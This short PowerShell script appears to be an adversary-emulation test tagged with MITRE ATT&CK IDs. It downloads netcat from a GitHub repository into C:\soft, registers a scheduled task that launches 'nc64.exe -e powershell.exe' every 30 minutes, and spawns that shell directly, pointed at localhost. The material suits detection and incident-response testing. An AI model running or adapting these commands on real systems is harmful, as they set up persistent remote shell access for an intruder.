#   Set Directory to C:\soft
$DirectoryToCreate = 'C:\soft'

#   Check if it already exists
if (-not (Test-Path -LiteralPath $DirectoryToCreate)) {
    
    try {
        New-Item -Path $DirectoryToCreate -ItemType Directory -ErrorAction Stop | Out-Null #-Force
    }
    catch {
        Write-Error -Message "Unable to create directory '$DirectoryToCreate'. Error was: $_" -ErrorAction Stop
    }


}
else {
    "Directory already existed"
}

#   Download nc onto the directory
Invoke-WebRequest -uri https://github.com/IArandom/check/raw/main/nc64.exe -outfile c:\soft\nc64.exe

#   T1053
#   Create a Scheduled Task that will spawn a shell each 30m
SCHTASKS /Create /SC MINUTE /TN "Incident Testing" /TR "C:\soft\nc64.exe 127.0.0.1 443 -e powershell.exe" /mo 30
SCHTASKS /Run /TN "Incident Testing"  


#   T1086
#   Spawn the shell
C:\soft\nc64.exe 127.0.0.1 443 -e powershell.exe
